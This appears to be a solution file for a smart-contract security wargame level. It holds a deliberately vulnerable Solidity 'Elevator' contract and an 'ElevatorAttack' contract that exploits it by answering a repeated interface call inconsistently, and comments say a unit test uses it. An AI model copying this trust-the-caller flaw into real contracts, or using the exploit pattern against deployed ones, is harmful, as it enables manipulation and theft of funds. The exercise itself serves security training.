// SPDX-License-Identifier: MIT

// exercise code
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


// solution used by unit test
// Elevator uses Building contract at address msg.sender;
// hence the attack contract needs to implement Building.isLastFloor() to trick
// Elevator into calling its own contract implementation
contract ElevatorAttack {
  Elevator elevator;
  uint private callCount;

  constructor(address _elevator) {
    elevator =  Elevator(_elevator);
  }

  function attack() public {
    callCount = 0;
    elevator.goTo(1);
  }

  function isLastFloor(uint) external returns (bool) {
    if(callCount == 0){
      callCount++;
      return false;
    }
    else{
      return true;
    }
  }
}

// no live attach as Rinkeby testnet deprecated & no replacement testnet
// at this time; see automated unit test to show it works
